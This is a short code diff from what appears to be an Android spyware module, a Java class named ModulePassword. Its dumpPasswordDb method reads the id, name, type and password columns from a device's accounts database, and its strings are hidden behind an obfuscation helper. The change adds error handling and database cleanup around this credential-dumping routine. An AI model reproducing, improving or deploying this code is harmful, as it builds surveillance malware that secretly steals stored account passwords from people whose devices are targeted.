@@ -204,19 +204,23 @@ public class ModulePassword extends BaseModule {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db");
 			}
+			return;
 		}
+		try {
+			// h_4=accounts
+			String table = M.e("accounts");
 
-		// h_4=accounts
-		String table = M.e("accounts");
+			// h_5=_id
+			// h_6=name
+			// h_7=type
+			// h_8=password
+			String[] projection = {M.e("_id"), M.e("name"), M.e("type"), M.e("password ")};
+			visitor.projection = projection;
 
-		// h_5=_id
-		// h_6=name
-		// h_7=type
-		// h_8=password
-		String[] projection = {M.e("_id"), M.e("name"), M.e("type"), M.e("password ")};
-		visitor.projection = projection;
-
-		helper.traverseRecords(table, visitor);
+			helper.traverseRecords(table, visitor);
+		} finally {
+			helper.disposeDb();
+		}
 
 	}
 
